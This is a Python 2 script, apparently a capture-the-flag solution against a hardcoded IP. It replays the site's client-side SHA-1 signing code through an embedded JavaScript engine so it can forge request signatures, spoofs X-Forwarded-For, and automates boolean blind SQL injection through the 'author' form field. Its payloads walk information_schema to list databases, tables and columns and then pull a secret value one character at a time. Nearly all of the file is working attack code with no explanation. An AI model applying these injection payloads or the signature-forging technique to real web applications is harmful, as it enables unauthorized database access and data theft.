import requests
import _PyV8 as pyv8
import re

ctf_host='116.85.43.88:8080'
ctf_server_url='http://116.85.43.88:8080/IQXDFSIOJGSMXTDR/dfe3ia/index.php'
xff_ip = '123.232.23.245'
f_log = r'/tmp/ctf.log'
session_request = requests.session()
headers = {
    'Host': ctf_host,
    'X-Forwarded-For': xff_ip,
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
    'Accept-Encoding': 'gzip, deflate',
    'Connection': 'close',
    'Upgrade-Insecure-Requests': '1'
}
first_response = session_request.get(ctf_server_url, headers=headers)
main_js = '''
(function(payload){
    var hexcase = 0; /* hex output format. 0 - lowercase; 1 - uppercase     */
    var b64pad = ""; /* base-64 pad character. "=" for strict RFC compliance  */
    var chrsz = 8; /* bits per input character. 8 - ASCII; 16 - Unicode    */

    /*
     * These are the functions you'll usually want to call
     * They take string arguments and return either hex or base-64 encoded strings
     */
    function hex_math_enc(s) {
        return binb2hex(core_math_enc(str2binb(s), s.length * chrsz));
    }
    function b64_math_enc(s) {
        return binb2b64(core_math_enc(str2binb(s), s.length * chrsz));
    }
    function str_math_enc(s) {
        return binb2str(core_math_enc(str2binb(s), s.length * chrsz));
    }
    function hex_hmac_math_enc(key, data) {
        return binb2hex(core_hmac_math_enc(key, data));
    }
    function b64_hmac_math_enc(key, data) {
        return binb2b64(core_hmac_math_enc(key, data));
    }
    function str_hmac_math_enc(key, data) {
        return binb2str(core_hmac_math_enc(key, data));
    }

    /*
     * Perform a simple self-test to see if the VM is working
     */
    function math_enc_vm_test() {
     return hex_math_enc("abc") == "a9993e364706816aba3e25717850c26c9cd0d89d";
    }

    /*
     * Calculate the SHA-1 of an array of big-endian words, and a bit length
     */
    function core_math_enc(x, len) {
        /* append padding */
        x[len >> 5] |= 0x80 << (24 - len % 32);
        x[((len + 64 >> 9) << 4) + 15] = len;
        var w = Array(80);
        var a = 1732584193;
        var b = -271733879;
        var c = -1732584194;
        var d = 271733878;
        var e = -1009589776;
        for (var i = 0; i < x.length; i += 16) {
            var olda = a;
            var oldb = b;
            var oldc = c;
            var oldd = d;
            var olde = e;
            for (var j = 0; j < 80; j++) {
                if (j < 16) w[j] = x[i + j];
                else w[j] = rol(w[j - 3] ^ w[j - 8] ^ w[j - 14] ^ w[j - 16], 1);
                var t = safe_add(safe_add(rol(a, 5), math_enc_ft(j, b, c, d)), safe_add(safe_add(e, w[j]), math_enc_kt(j)));
                e = d;
                d = c;
                c = rol(b, 30);
                b = a;
                a = t;
            }
            a = safe_add(a, olda);
            b = safe_add(b, oldb);
            c = safe_add(c, oldc);
            d = safe_add(d, oldd);
            e = safe_add(e, olde);
        }
        return Array(a, b, c, d, e);
    }

    /*
     * Perform the appropriate triplet combination function for the current
     * iteration
     */
    function math_enc_ft(t, b, c, d) {
        if (t < 20) return (b & c) | ((~b) & d);
        if (t < 40) return b ^ c ^ d;
        if (t < 60) return (b & c) | (b & d) | (c & d);
        return b ^ c ^ d;
    }

    /*
     * Determine the appropriate additive constant for the current iteration
     */
    function math_enc_kt(t) {
        return (t < 20) ? 1518500249 : (t < 40) ? 1859775393 : (t < 60) ? -1894007588 : -899497514;
    }

    /*
     * Calculate the HMAC-SHA1 of a key and some data
     */
    function core_hmac_math_enc(key, data) {
        var bkey = str2binb(key);
        if (bkey.length > 16) bkey = core_math_enc(bkey, key.length * chrsz);
            var ipad = Array(16),
        opad = Array(16);
        for (var i = 0; i < 16; i++) {
            ipad[i] = bkey[i] ^ 0x36363636;
            opad[i] = bkey[i] ^ 0x5C5C5C5C;
        }
        var hash = core_math_enc(ipad.concat(str2binb(data)), 512 + data.length * chrsz);
        return core_math_enc(opad.concat(hash), 512 + 160);
    }

    /*
     * Add integers, wrapping at 2^32. This uses 16-bit operations internally
     * to work around bugs in some JS interpreters.
     */
    function safe_add(x, y) {
        var lsw = (x & 0xFFFF) + (y & 0xFFFF);
        var msw = (x >> 16) + (y >> 16) + (lsw >> 16);
        return (msw << 16) | (lsw & 0xFFFF);
    }

    /*
     * Bitwise rotate a 32-bit number to the left.
     */
    function rol(num, cnt) {
        return (num << cnt) | (num >>> (32 - cnt));
    }

    /*
     * Convert an 8-bit or 16-bit string to an array of big-endian words
     * In 8-bit function, characters >255 have their hi-byte silently ignored.
     */
    function str2binb(str) {
        var bin = Array();
        var mask = (1 << chrsz) - 1;
        for (var i = 0; i < str.length * chrsz; i += chrsz)
        bin[i >> 5] |= (str.charCodeAt(i / chrsz) & mask) << (24 - i % 32);
        return bin;
    }

    /*
     * Convert an array of big-endian words to a string
     */
    function binb2str(bin) {
        var str = "";
        var mask = (1 << chrsz) - 1;
        for (var i = 0; i < bin.length * 32; i += chrsz)
        str += String.fromCharCode((bin[i >> 5] >>> (24 - i % 32)) & mask);
        return str;
    }

    /*
     * Convert an array of big-endian words to a hex string.
     */
    function binb2hex(binarray) {
        var hex_tab = hexcase ? "0123456789ABCDEF" : "0123456789abcdef";
        var str = "";
        for (var i = 0; i < binarray.length * 4; i++) {
        str += hex_tab.charAt((binarray[i >> 2] >> ((3 - i % 4) * 8 + 4)) & 0xF) + hex_tab.charAt((binarray[i >> 2] >> ((3 - i % 4) * 8)) & 0xF);
        }
        return str;
    }

    /*
     * Convert an array of big-endian words to a base-64 string
     */
    function binb2b64(binarray) {
        var tab = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
        var str = "";
        for (var i = 0; i < binarray.length * 4; i += 3) {
        var triplet = (((binarray[i >> 2] >> 8 * (3 - i % 4)) & 0xFF) << 16) | (((binarray[i + 1 >> 2] >> 8 * (3 - (i + 1) % 4)) & 0xFF) << 8) | ((binarray[i + 2 >> 2] >> 8 * (3 - (i + 2) % 4)) & 0xFF);
        for (var j = 0; j < 4; j++) {
            if (i * 8 + j * 6 > binarray.length * 32) str += b64pad;
            else str += tab.charAt((triplet >> 6 * (3 - j)) & 0x3F);
            }
        }
        return str;
    }

    var key="\141\144\162\145\146\153\146\167\145\157\144\146\163\144\160\151\162\165";
    var current_time = parseInt(new Date().getTime() / 1000);
    var obj = {
        id: '',
        title: '',
        author: payload,
        date: '',
        time: current_time
    };
        var str0 = '';
        for (i in obj) {
            if (i != 'sign') {
                str1 = '';
                str1 = i + '=' + obj[i];
                str0 += str1
            }
            }
        var ret = hex_math_enc(str0 + key)+','+current_time;
        return ret
    })
'''

headers2 = {
    'Host': ctf_host,
    'X-Forwarded-For': xff_ip,
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
    'Accept-Encoding': 'gzip, deflate',
    'Referer': ctf_server_url,
    'Content-Type': 'application/x-www-form-urlencoded',
    'Connection': 'close',
    'Upgrade-Insecure-Requests': '1'
}
ctxt = pyv8.JSContext()
ctxt.enter()
sig = ctxt.eval(main_js)
db_name_arr = []
res = open(f_log, 'a+')
for limit in range(0,100):
    table_name = ''
    flag = 0
    for start_idx in range(1,40):
        for ascii in range(32,127):
            #------ db
            #payload = '''admin' && binary substr((select SCHEMA_NAME from information_schema.SCHEMATA limit '''+str(limit)+',1),'+str(start_idx)+''',1)=\''''+chr(ascii)+'''\'#'''
            #------ table
            #payload = '''admin' && binary substr((select TABLE_NAME from information_schema.TABLES where TABLE_SCHEMA like "ddctf" limit '''+str(limit)+',1),'+str(start_idx)+''',1)=\''''+chr(ascii)+'''\'#'''
            #------ field
            #payload = '''admin' && binary substr((select COLUMN_NAME from information_schema.COLUMNS where TABLE_NAME like "ctf_key6" limit '''+str(limit)+',1),'+str(start_idx)+''',1)=\''''+chr(ascii)+'''\'#'''
            #------ flag
            payload = '''admin' && binary substr((select secvalue from ctf_key6 limit ''' + str(limit) + ',1),' + str(start_idx) + ''',1)=\'''' + chr(ascii) + '''\'#'''

            sign_arr = str( sig(payload)).split(',')
            data = {
                'id':'',
                'title':'',
                'date':'',
                'author':payload,
                'button':'search',
                'sig':sign_arr[0],
                'time':sign_arr[1]
            }
            post_url = ctf_server_url + '?sig='+sign_arr[0]+'time='+sign_arr[1]
            sql_res = session_request.post(post_url,headers=headers2,data=data).content
            if re.search('''admin''',sql_res):
                table_name += chr(ascii)
                print 'table:'+str(limit)+' index:'+str(start_idx)+' [success],and it is:'+chr(ascii)
                break
            if ascii == 126:
                db_name_arr.append(table_name)
                flag = 1
                break
        if  (flag == 1):
            break
    if table_name == '':
        break
    res.writelines(table_name+'\n')
    print db_name_arr
res.close()
